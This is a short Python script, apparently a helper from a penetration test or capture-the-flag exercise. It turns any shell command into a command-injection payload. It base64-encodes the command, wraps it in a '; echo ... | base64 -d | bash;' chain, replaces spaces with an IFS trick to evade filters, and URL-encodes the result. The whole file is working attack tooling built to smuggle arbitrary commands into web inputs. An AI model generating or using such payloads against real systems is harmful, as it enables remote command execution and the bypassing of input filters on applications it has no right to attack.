import os
import base64
import sys
import urllib.parse

cmd = sys.argv[1]
cmd = base64.b64encode(cmd.encode('utf-8')).decode('utf-8')
cmd = f'; echo "{cmd}" | base64 -d | bash;'
cmd = cmd.replace(" ", "${IFS%??}")
cmd = urllib.parse.quote(cmd)
print(cmd)

